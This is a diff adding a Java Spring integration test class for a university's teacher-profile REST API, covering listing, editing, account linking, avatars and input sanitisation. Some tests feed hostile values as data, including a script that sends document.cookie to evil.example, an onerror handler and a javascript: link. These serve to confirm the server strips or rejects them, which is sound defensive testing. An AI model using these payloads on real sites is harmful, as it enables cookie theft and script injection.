@@ -1,0 +1,770 @@
+package ru.stankin.uits.module.staff;
+
+import org.junit.jupiter.api.Test;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.core.ParameterizedTypeReference;
+import org.springframework.http.HttpEntity;
+import org.springframework.http.HttpHeaders;
+import org.springframework.http.HttpMethod;
+import org.springframework.http.HttpStatus;
+import org.springframework.http.MediaType;
+import org.springframework.http.ProblemDetail;
+import org.springframework.http.ResponseEntity;
+import ru.stankin.uits.AbstractIntegrationTest;
+import ru.stankin.uits.TestRole;
+import ru.stankin.uits.common.PageResponseDto;
+import ru.stankin.uits.module.staff.dto.SubjectDto;
+import ru.stankin.uits.module.staff.dto.TeacherDetailsResponseDto;
+import ru.stankin.uits.module.staff.dto.TeacherRequestDto;
+import ru.stankin.uits.module.staff.dto.TeacherResponseDto;
+import ru.stankin.uits.module.staff.entity.Subject;
+import ru.stankin.uits.module.staff.entity.Teacher;
+import ru.stankin.uits.module.staff.enums.TeacherDegree;
+import ru.stankin.uits.module.staff.enums.TeacherRank;
+import ru.stankin.uits.module.staff.repository.SubjectRepository;
+import ru.stankin.uits.module.staff.repository.TeacherRepository;
+import ru.stankin.uits.module.user.entity.User;
+
+import java.io.IOException;
+import java.util.List;
+import java.util.Map;
+
+import static org.assertj.core.api.Assertions.assertThat;
+
+class TeacherIntegrationTest extends AbstractIntegrationTest {
+
+    @Autowired
+    private TeacherRepository teacherRepository;
+
+    @Autowired
+    private SubjectRepository subjectRepository;
+
+    private Teacher createCard(String lastName, String firstName) {
+        return teacherRepository.save(Teacher.builder()
+                .lastName(lastName)
+                .firstName(firstName)
+                .position("доцент")
+                .build());
+    }
+
+    private Subject createSubject(String name) {
+        return subjectRepository.save(Subject.builder().name(name).build());
+    }
+
+    private HttpHeaders authJson(String token) {
+        HttpHeaders headers = new HttpHeaders();
+        headers.setBearerAuth(token);
+        headers.setContentType(MediaType.APPLICATION_JSON);
+
+        return headers;
+    }
+
+    private String moderatorToken() {
+        createUser("moder", TestRole.MODERATOR);
+
+        return login("moder");
+    }
+
+    @Test
+    void getTeachers_ReturnsPageSortedByLastName_WithoutAccounts() {
+        createCard("Яковлев", "Пётр");
+        createCard("Абрамов", "Иван");
+
+        ResponseEntity<PageResponseDto<TeacherResponseDto>> response = restTemplate.exchange(
+                "/api/public/teachers",
+                HttpMethod.GET,
+                null,
+                new ParameterizedTypeReference<>() {});
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
+        PageResponseDto<TeacherResponseDto> body = response.getBody();
+        assertThat(body).isNotNull();
+        assertThat(body.totalElements()).isEqualTo(2);
+        assertThat(body.content().getFirst().getLastName()).isEqualTo("Абрамов");
+        assertThat(body.content().getLast().getLastName()).isEqualTo("Яковлев");
+    }
+
+    @Test
+    void getTeachers_WhenSortFieldIsUnknown_Returns400() {
+        ResponseEntity<ProblemDetail> response = restTemplate.getForEntity(
+                "/api/public/teachers?sort=abc",
+                ProblemDetail.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
+        assertThat(response.getBody()).isNotNull();
+        assertThat(response.getBody().getDetail()).contains("abc");
+    }
+
+    @Test
+    void getTeacherDetails_ReturnsCardWithSubjectsSortedByName() {
+        Teacher card = createCard("Иванова", "Мария");
+        card.setDegree(TeacherDegree.CANDIDATE_TECH);
+        card.setRank(TeacherRank.READER);
+        card.getSubjects().add(createSubject("Проектирование ИС"));
+        card.getSubjects().add(createSubject("Базы данных"));
+        teacherRepository.save(card);
+
+        ResponseEntity<TeacherDetailsResponseDto> response = restTemplate.getForEntity(
+                "/api/public/teachers/" + card.getId(),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
+        TeacherDetailsResponseDto body = response.getBody();
+        assertThat(body).isNotNull();
+        assertThat(body.getDegree()).isEqualTo("CANDIDATE_TECH");
+        assertThat(body.getRank()).isEqualTo("READER");
+        assertThat(body.getSubjects())
+                .extracting(SubjectDto::getName)
+                .containsExactly("Базы данных", "Проектирование ИС");
+    }
+
+    @Test
+    void getTeacherDetails_WhenUnknownId_Returns404() {
+        ResponseEntity<ProblemDetail> response = restTemplate.getForEntity(
+                "/api/public/teachers/9999",
+                ProblemDetail.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.NOT_FOUND);
+    }
+
+    @Test
+    void createTeacher_AsModerator_Returns201WithLocationAndSubjects() {
+        Subject subject = createSubject("Базы данных");
+        TeacherRequestDto request = TeacherRequestDto.builder()
+                .lastName("Сидоров")
+                .firstName("Олег")
+                .patronymic("Иванович")
+                .position("профессор")
+                .degree(TeacherDegree.DOCTOR_TECH)
+                .rank(TeacherRank.PROFESSOR)
+                .subjectIds(List.of(subject.getId()))
+                .build();
+
+        ResponseEntity<TeacherDetailsResponseDto> response = restTemplate.exchange(
+                "/api/teachers",
+                HttpMethod.POST,
+                new HttpEntity<>(request, authJson(moderatorToken())),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.CREATED);
+        TeacherDetailsResponseDto body = response.getBody();
+        assertThat(body).isNotNull();
+        assertThat(body.getId()).isNotNull();
+        assertThat(response.getHeaders().getLocation())
+                .isNotNull()
+                .hasToString("/api/teachers/" + body.getId());
+        assertThat(body.getSubjects()).extracting(SubjectDto::getName).containsExactly("Базы данных");
+    }
+
+    @Test
+    void createTeacher_WithUnknownSubjectId_Returns400() {
+        TeacherRequestDto request = TeacherRequestDto.builder()
+                .lastName("Сидоров")
+                .firstName("Олег")
+                .position("профессор")
+                .subjectIds(List.of(9999L))
+                .build();
+
+        ResponseEntity<ProblemDetail> response = restTemplate.exchange(
+                "/api/teachers",
+                HttpMethod.POST,
+                new HttpEntity<>(request, authJson(moderatorToken())),
+                ProblemDetail.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
+        assertThat(response.getBody()).isNotNull();
+        assertThat(response.getBody().getDetail()).contains("9999");
+        assertThat(response.getBody().getProperties())
+                .containsEntry("errors", Map.of("subjectIds", List.of(response.getBody().getDetail())));
+    }
+
+    @Test
+    void createTeacher_WithUnknownDegreeCode_Returns400() {
+        String body = "{\"lastName\":\"Тестов\",\"firstName\":\"Тест\","
+                + "\"position\":\"доцент\",\"degree\":\"KANDIDAT\"}";
+
+        ResponseEntity<ProblemDetail> response = restTemplate.exchange(
+                "/api/teachers",
+                HttpMethod.POST,
+                new HttpEntity<>(body, authJson(moderatorToken())),
+                ProblemDetail.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
+    }
+
+    @Test
+    void createTeacher_WithJavascriptExamScheduleLink_Returns400() {
+        TeacherRequestDto request = TeacherRequestDto.builder()
+                .lastName("Тестов")
+                .firstName("Тест")
+                .position("доцент")
+                .examScheduleGraduation("javascript:alert(1)")
+                .build();
+
+        ResponseEntity<ProblemDetail> response = restTemplate.exchange(
+                "/api/teachers",
+                HttpMethod.POST,
+                new HttpEntity<>(request, authJson(moderatorToken())),
+                ProblemDetail.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
+        assertThat(teacherRepository.count()).isZero();
+    }
+
+    @Test
+    void createTeacher_AcceptsHttpsAndRelativeExamScheduleLinks() {
+        TeacherRequestDto request = TeacherRequestDto.builder()
+                .lastName("Тестов")
+                .firstName("Тест")
+                .position("доцент")
+                .examScheduleGraduation("https://stankin.ru/exams.pdf")
+                .examScheduleNonGraduation("/media/exams/testov.pdf")
+                .build();
+
+        ResponseEntity<TeacherDetailsResponseDto> response = restTemplate.exchange(
+                "/api/teachers",
+                HttpMethod.POST,
+                new HttpEntity<>(request, authJson(moderatorToken())),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.CREATED);
+        assertThat(response.getBody()).isNotNull();
+        assertThat(response.getBody().getExamScheduleGraduation()).isEqualTo("https://stankin.ru/exams.pdf");
+        assertThat(response.getBody().getExamScheduleNonGraduation()).isEqualTo("/media/exams/testov.pdf");
+    }
+
+    @Test
+    void updateTeacher_WithProtocolRelativeExamScheduleLink_Returns400() {
+        Teacher card = createCard("Иванова", "Мария");
+        TeacherRequestDto request = TeacherRequestDto.builder()
+                .lastName("Иванова")
+                .firstName("Мария")
+                .position("доцент")
+                .examScheduleNonGraduation("//evil.example.com/exams.pdf")
+                .build();
+
+        ResponseEntity<ProblemDetail> response = restTemplate.exchange(
+                "/api/teachers/" + card.getId(),
+                HttpMethod.PUT,
+                new HttpEntity<>(request, authJson(moderatorToken())),
+                ProblemDetail.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
+        assertThat(teacherRepository.findById(card.getId()).orElseThrow().getExamScheduleNonGraduation()).isNull();
+    }
+
+    @Test
+    void updateTeacher_ReplacesFieldsAndSubjects() {
+        Teacher card = createCard("Иванова", "Мария");
+        card.getSubjects().add(createSubject("Базы данных"));
+        teacherRepository.save(card);
+        Subject newSubject = createSubject("Веб-разработка");
+
+        TeacherRequestDto request = TeacherRequestDto.builder()
+                .lastName("Иванова")
+                .firstName("Мария")
+                .position("профессор")
+                .rank(TeacherRank.PROFESSOR)
+                .subjectIds(List.of(newSubject.getId()))
+                .build();
+
+        ResponseEntity<TeacherDetailsResponseDto> response = restTemplate.exchange(
+                "/api/teachers/" + card.getId(),
+                HttpMethod.PUT,
+                new HttpEntity<>(request, authJson(moderatorToken())),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
+        TeacherDetailsResponseDto body = response.getBody();
+        assertThat(body).isNotNull();
+        assertThat(body.getPosition()).isEqualTo("профессор");
+        assertThat(body.getRank()).isEqualTo("PROFESSOR");
+        assertThat(body.getSubjects()).extracting(SubjectDto::getName).containsExactly("Веб-разработка");
+    }
+
+    @Test
+    void updateTeacher_WhenOptionalFieldsAreBlank_SavesNull() {
+        Teacher card = createCard("Иванова", "Мария");
+
+        TeacherRequestDto request = TeacherRequestDto.builder()
+                .lastName("Иванова")
+                .firstName("Мария")
+                .position("доцент")
+                .patronymic("")
+                .email("   ")
+                .build();
+
+        ResponseEntity<TeacherDetailsResponseDto> response = restTemplate.exchange(
+                "/api/teachers/" + card.getId(),
+                HttpMethod.PUT,
+                new HttpEntity<>(request, authJson(moderatorToken())),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
+        TeacherDetailsResponseDto body = response.getBody();
+        assertThat(body).isNotNull();
+        assertThat(body.getPatronymic()).isNull();
+        assertThat(body.getEmail()).isNull();
+        Teacher updated = teacherRepository.findById(card.getId()).orElseThrow();
+        assertThat(updated.getPatronymic()).isNull();
+        assertThat(updated.getEmail()).isNull();
+    }
+
+    @Test
+    void updateTeacher_WhenAvatarIsBlank_ClearsAvatarAndDeletesFile() throws IOException {
+        Teacher card = createCard("Иванова", "Мария");
+        String key = storeFile("avatars");
+        card.setAvatar(key);
+        teacherRepository.save(card);
+
+        TeacherRequestDto request = TeacherRequestDto.builder()
+                .lastName("Иванова")
+                .firstName("Мария")
+                .position("доцент")
+                .avatar("")
+                .build();
+
+        ResponseEntity<TeacherDetailsResponseDto> response = restTemplate.exchange(
+                "/api/teachers/" + card.getId(),
+                HttpMethod.PUT,
+                new HttpEntity<>(request, authJson(moderatorToken())),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
+        assertThat(response.getBody()).isNotNull();
+        assertThat(response.getBody().getAvatarUrl()).isNull();
+        assertThat(teacherRepository.findById(card.getId()).orElseThrow().getAvatar()).isNull();
+        assertThat(STORAGE_ROOT.resolve(key)).doesNotExist();
+    }
+
+    /** Аватар карточки живёт в avatars: ключ существующего файла из чужого раздела не принимается (D-13). */
+    @Test
+    void updateTeacher_WhenAvatarKeyFromOtherCategory_Returns400() throws IOException {
+        Teacher card = createCard("Иванова", "Мария");
+        String newsKey = storeFile("news");
+
+        TeacherRequestDto request = TeacherRequestDto.builder()
+                .lastName("Иванова")
+                .firstName("Мария")
+                .position("доцент")
+                .avatar(newsKey)
+                .build();
+
+        ResponseEntity<ProblemDetail> response = restTemplate.exchange(
+                "/api/teachers/" + card.getId(),
+                HttpMethod.PUT,
+                new HttpEntity<>(request, authJson(moderatorToken())),
+                ProblemDetail.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
+        assertThat(response.getBody()).isNotNull();
+        assertThat(response.getBody().getProperties())
+                .containsEntry("errors", Map.of("avatar", List.of(response.getBody().getDetail())));
+        assertThat(teacherRepository.findById(card.getId()).orElseThrow().getAvatar()).isNull();
+        assertThat(STORAGE_ROOT.resolve(newsKey)).exists();
+    }
+
+    private ResponseEntity<TeacherDetailsResponseDto> publicCard(Long id) {
+        return restTemplate.getForEntity("/api/public/teachers/" + id, TeacherDetailsResponseDto.class);
+    }
+
+    private ResponseEntity<TeacherDetailsResponseDto> updateCard(Long id, TeacherRequestDto request, String token) {
+        return restTemplate.exchange(
+                "/api/teachers/" + id,
+                HttpMethod.PUT,
+                new HttpEntity<>(request, authJson(token)),
+                TeacherDetailsResponseDto.class
+        );
+    }
+
+    private TeacherRequestDto.TeacherRequestDtoBuilder cardRequest() {
+        return TeacherRequestDto.builder()
+                .lastName("Иванова")
+                .firstName("Мария")
+                .position("доцент");
+    }
+
+    @Test
+    void createTeacher_WithUserId_LinksAccountAndOpensMyCard() {
+        User teacherUser = createUser("teacher_user", TestRole.TEACHER);
+
+        ResponseEntity<TeacherDetailsResponseDto> created = restTemplate.exchange(
+                "/api/teachers",
+                HttpMethod.POST,
+                new HttpEntity<>(cardRequest().userId(teacherUser.getId()).build(), authJson(moderatorToken())),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(created.getStatusCode()).isEqualTo(HttpStatus.CREATED);
+        assertThat(created.getBody()).isNotNull();
+        assertThat(created.getBody().getUserId()).isEqualTo(teacherUser.getId());
+
+        ResponseEntity<TeacherDetailsResponseDto> myCard = restTemplate.exchange(
+                "/api/teachers/me",
+                HttpMethod.GET,
+                new HttpEntity<>(authJson(login("teacher_user"))),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(myCard.getStatusCode()).isEqualTo(HttpStatus.OK);
+        assertThat(myCard.getBody()).isNotNull();
+        assertThat(myCard.getBody().getId()).isEqualTo(created.getBody().getId());
+    }
+
+    @Test
+    void updateTeacher_WithUserId_LinksAccountToExistingCard() {
+        User teacherUser = createUser("teacher_user", TestRole.TEACHER);
+        Teacher card = createCard("Иванова", "Мария");
+
+        assertThat(updateCard(card.getId(), cardRequest().userId(teacherUser.getId()).build(), moderatorToken())
+                .getStatusCode()).isEqualTo(HttpStatus.OK);
+
+        assertThat(publicCard(card.getId()).getBody().getUserId()).isEqualTo(teacherUser.getId());
+    }
+
+    @Test
+    void updateTeacher_WhenUserIdResubmitted_KeepsLink() {
+        User teacherUser = createUser("teacher_user", TestRole.TEACHER);
+        Teacher card = createCard("Иванова", "Мария");
+        card.setUser(teacherUser);
+        teacherRepository.save(card);
+
+        assertThat(updateCard(card.getId(), cardRequest().userId(teacherUser.getId()).build(), moderatorToken())
+                .getStatusCode()).isEqualTo(HttpStatus.OK);
+
+        assertThat(publicCard(card.getId()).getBody().getUserId()).isEqualTo(teacherUser.getId());
+    }
+
+    @Test
+    void updateTeacher_WhenUserIdOmitted_ClearsLink() {
+        User teacherUser = createUser("teacher_user", TestRole.TEACHER);
+        Teacher card = createCard("Иванова", "Мария");
+        card.setUser(teacherUser);
+        teacherRepository.save(card);
+
+        assertThat(updateCard(card.getId(), cardRequest().build(), moderatorToken())
+                .getStatusCode()).isEqualTo(HttpStatus.OK);
+
+        assertThat(publicCard(card.getId()).getBody().getUserId()).isNull();
+    }
+
+    @Test
+    void updateTeacher_WhenAccountLinkedToAnotherCard_Returns400() {
+        User teacherUser = createUser("teacher_user", TestRole.TEACHER);
+        Teacher linked = createCard("Иванова", "Мария");
+        linked.setUser(teacherUser);
+        teacherRepository.save(linked);
+        Teacher other = createCard("Абрамов", "Пётр");
+
+        ResponseEntity<ProblemDetail> response = restTemplate.exchange(
+                "/api/teachers/" + other.getId(),
+                HttpMethod.PUT,
+                new HttpEntity<>(cardRequest().userId(teacherUser.getId()).build(), authJson(moderatorToken())),
+                ProblemDetail.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
+        assertThat(response.getBody()).isNotNull();
+        assertThat(response.getBody().getProperties())
+                .containsEntry("errors", Map.of("userId", List.of(response.getBody().getDetail())));
+        assertThat(publicCard(other.getId()).getBody().getUserId()).isNull();
+    }
+
+    @Test
+    void updateTeacher_WhenAccountHasNoTeacherRole_Returns400() {
+        User plainUser = createUser("plain_user", TestRole.USER);
+        Teacher card = createCard("Иванова", "Мария");
+
+        ResponseEntity<ProblemDetail> response = restTemplate.exchange(
+                "/api/teachers/" + card.getId(),
+                HttpMethod.PUT,
+                new HttpEntity<>(cardRequest().userId(plainUser.getId()).build(), authJson(moderatorToken())),
+                ProblemDetail.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
+        assertThat(response.getBody()).isNotNull();
+        assertThat(response.getBody().getProperties())
+                .containsEntry("errors", Map.of("userId", List.of(response.getBody().getDetail())));
+        assertThat(publicCard(card.getId()).getBody().getUserId()).isNull();
+    }
+
+    @Test
+    void updateTeacher_WhenAccountUnknown_Returns400() {
+        Teacher card = createCard("Иванова", "Мария");
+
+        ResponseEntity<ProblemDetail> response = restTemplate.exchange(
+                "/api/teachers/" + card.getId(),
+                HttpMethod.PUT,
+                new HttpEntity<>(cardRequest().userId(999999L).build(), authJson(moderatorToken())),
+                ProblemDetail.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
+        assertThat(response.getBody()).isNotNull();
+        assertThat(response.getBody().getDetail()).isEqualTo("Учётная запись не найдена: id=999999");
+        assertThat(response.getBody().getProperties())
+                .containsEntry("errors", Map.of("userId", List.of(response.getBody().getDetail())));
+    }
+
+    @Test
+    void updateMyCard_WhenUserIdSubmitted_IgnoresIt() {
+        User teacherUser = createUser("teacher_user", TestRole.TEACHER);
+        User stranger = createUser("stranger", TestRole.TEACHER);
+        Teacher card = createCard("Иванова", "Мария");
+        card.setUser(teacherUser);
+        teacherRepository.save(card);
+
+        ResponseEntity<TeacherDetailsResponseDto> response = restTemplate.exchange(
+                "/api/teachers/me",
+                HttpMethod.PUT,
+                new HttpEntity<>(cardRequest().userId(stranger.getId()).build(), authJson(login("teacher_user"))),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
+        assertThat(response.getBody()).isNotNull();
+        assertThat(response.getBody().getUserId()).isEqualTo(teacherUser.getId());
+    }
+
+    @Test
+    void deleteTeacher_Returns204AndCardDisappears() {
+        Teacher card = createCard("Иванова", "Мария");
+        String token = moderatorToken();
+
+        ResponseEntity<Void> deleteResponse = restTemplate.exchange(
+                "/api/teachers/" + card.getId(),
+                HttpMethod.DELETE,
+                new HttpEntity<>(authJson(token)),
+                Void.class
+        );
+
+        assertThat(deleteResponse.getStatusCode()).isEqualTo(HttpStatus.NO_CONTENT);
+        assertThat(teacherRepository.findById(card.getId())).isEmpty();
+    }
+
+    @Test
+    void myCard_AsLinkedTeacher_ReturnsOwnCard() {
+        User teacherUser = createUser("teacher_user", TestRole.TEACHER);
+        Teacher card = createCard("Иванова", "Мария");
+        card.setUser(teacherUser);
+        teacherRepository.save(card);
+
+        ResponseEntity<TeacherDetailsResponseDto> response = restTemplate.exchange(
+                "/api/teachers/me",
+                HttpMethod.GET,
+                new HttpEntity<>(authJson(login("teacher_user"))),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
+        assertThat(response.getBody()).isNotNull();
+        assertThat(response.getBody().getId()).isEqualTo(card.getId());
+        assertThat(response.getBody().getLastName()).isEqualTo("Иванова");
+    }
+
+    @Test
+    void updateMyCard_UpdatesFieldsButIgnoresSubjectIds() {
+        User teacherUser = createUser("teacher_user", TestRole.TEACHER);
+        Teacher card = createCard("Иванова", "Мария");
+        card.setUser(teacherUser);
+        card.getSubjects().add(createSubject("Базы данных"));
+        teacherRepository.save(card);
+        Subject foreignSubject = createSubject("Веб-разработка");
+
+        TeacherRequestDto request = TeacherRequestDto.builder()
+                .lastName("Иванова")
+                .firstName("Мария")
+                .position("доцент")
+                .bio("Обновлённая биография")
+                .subjectIds(List.of(foreignSubject.getId()))
+                .build();
+
+        ResponseEntity<TeacherDetailsResponseDto> response = restTemplate.exchange(
+                "/api/teachers/me",
+                HttpMethod.PUT,
+                new HttpEntity<>(request, authJson(login("teacher_user"))),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
+        TeacherDetailsResponseDto body = response.getBody();
+        assertThat(body).isNotNull();
+        assertThat(body.getBio()).isEqualTo("Обновлённая биография");
+        assertThat(body.getSubjects()).extracting(SubjectDto::getName).containsExactly("Базы данных");
+    }
+
+    @Test
+    void updateMyCard_WhenAvatarKeyResubmitted_KeepsPhotoAndFile() throws IOException {
+        User teacherUser = createUser("teacher_user", TestRole.TEACHER);
+        Teacher card = createCard("Иванова", "Мария");
+        String key = storeFile("avatars");
+        card.setUser(teacherUser);
+        card.setAvatar(key);
+        teacherRepository.save(card);
+        String token = login("teacher_user");
+
+        ResponseEntity<TeacherDetailsResponseDto> stored = restTemplate.exchange(
+                "/api/teachers/me",
+                HttpMethod.GET,
+                new HttpEntity<>(authJson(token)),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(stored.getBody()).isNotNull();
+        assertThat(stored.getBody().getAvatar()).isEqualTo(key);
+
+        TeacherRequestDto request = TeacherRequestDto.builder()
+                .lastName("Иванова")
+                .firstName("Мария")
+                .position("доцент")
+                .phoneNumber("+7 (499) 972-95-84")
+                .avatar(stored.getBody().getAvatar())
+                .build();
+
+        ResponseEntity<TeacherDetailsResponseDto> response = restTemplate.exchange(
+                "/api/teachers/me",
+                HttpMethod.PUT,
+                new HttpEntity<>(request, authJson(token)),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
+        assertThat(response.getBody()).isNotNull();
+        assertThat(response.getBody().getAvatar()).isEqualTo(key);
+        assertThat(response.getBody().getPhoneNumber()).isEqualTo("+7 (499) 972-95-84");
+        assertThat(teacherRepository.findById(card.getId()).orElseThrow().getAvatar()).isEqualTo(key);
+        assertThat(STORAGE_ROOT.resolve(key)).exists();
+    }
+
+    @Test
+    void myCard_WhenNoCardLinked_Returns404() {
+        createUser("teacher_user", TestRole.TEACHER);
+
+        ResponseEntity<ProblemDetail> response = restTemplate.exchange(
+                "/api/teachers/me",
+                HttpMethod.GET,
+                new HttpEntity<>(authJson(login("teacher_user"))),
+                ProblemDetail.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.NOT_FOUND);
+    }
+
+    @Test
+    void createTeacher_WhenEducationContainsScript_StripsScriptAndKeepsFormatting() {
+        TeacherRequestDto request = TeacherRequestDto.builder()
+                .lastName("Сидоров")
+                .firstName("Олег")
+                .position("профессор")
+                .education("<p>МГТУ <b>СТАНКИН</b>, 2010</p>"
+                        + "<script>fetch('https://evil.example/?t=' + document.cookie)</script>")
+                .build();
+
+        ResponseEntity<TeacherDetailsResponseDto> response = restTemplate.exchange(
+                "/api/teachers",
+                HttpMethod.POST,
+                new HttpEntity<>(request, authJson(moderatorToken())),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.CREATED);
+        Teacher saved = teacherRepository.findAll().getFirst();
+        assertThat(saved.getEducation())
+                .doesNotContain("<script")
+                .contains("<b>СТАНКИН</b>");
+    }
+
+    @Test
+    void updateMyCard_WhenQualificationContainsEventHandler_StripsHandler() {
+        User teacherUser = createUser("teacher_user", TestRole.TEACHER);
+        Teacher card = createCard("Иванова", "Мария");
+        card.setUser(teacherUser);
+        teacherRepository.save(card);
+
+        TeacherRequestDto request = TeacherRequestDto.builder()
+                .lastName("Иванова")
+                .firstName("Мария")
+                .position("доцент")
+                .qualification("<p>Курс <img src=\"x\" onerror=\"alert(1)\"></p>")
+                .build();
+
+        ResponseEntity<TeacherDetailsResponseDto> response = restTemplate.exchange(
+                "/api/teachers/me",
+                HttpMethod.PUT,
+                new HttpEntity<>(request, authJson(login("teacher_user"))),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
+        Teacher updated = teacherRepository.findById(card.getId()).orElseThrow();
+        assertThat(updated.getQualification())
+                .doesNotContain("onerror")
+                .contains("<p>Курс");
+    }
+
+    @Test
+    void updateMyCard_WhenEducationIsOnlyForbiddenMarkup_SavesNull() {
+        User teacherUser = createUser("teacher_user", TestRole.TEACHER);
+        Teacher card = createCard("Иванова", "Мария");
+        card.setUser(teacherUser);
+        card.setEducation("<p>МГТУ СТАНКИН</p>");
+        teacherRepository.save(card);
+
+        TeacherRequestDto request = TeacherRequestDto.builder()
+                .lastName("Иванова")
+                .firstName("Мария")
+                .position("доцент")
+                .education("<script>alert(1)</script>")
+                .build();
+
+        ResponseEntity<TeacherDetailsResponseDto> response = restTemplate.exchange(
+                "/api/teachers/me",
+                HttpMethod.PUT,
+                new HttpEntity<>(request, authJson(login("teacher_user"))),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
+        assertThat(teacherRepository.findById(card.getId()).orElseThrow().getEducation()).isNull();
+    }
+
+    @Test
+    void updateMyCard_WhenBioContainsMarkup_KeepsItVerbatim() {
+        User teacherUser = createUser("teacher_user", TestRole.TEACHER);
+        Teacher card = createCard("Иванова", "Мария");
+        card.setUser(teacherUser);
+        teacherRepository.save(card);
+
+        TeacherRequestDto request = TeacherRequestDto.builder()
+                .lastName("Иванова")
+                .firstName("Мария")
+                .position("доцент")
+                .bio("Научные интересы: <b>СУБД</b> и 5 < 7")
+                .build();
+
+        ResponseEntity<TeacherDetailsResponseDto> response = restTemplate.exchange(
+                "/api/teachers/me",
+                HttpMethod.PUT,
+                new HttpEntity<>(request, authJson(login("teacher_user"))),
+                TeacherDetailsResponseDto.class
+        );
+
+        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
+        assertThat(teacherRepository.findById(card.getId()).orElseThrow().getBio())
+                .isEqualTo("Научные интересы: <b>СУБД</b> и 5 < 7");
+    }
+}
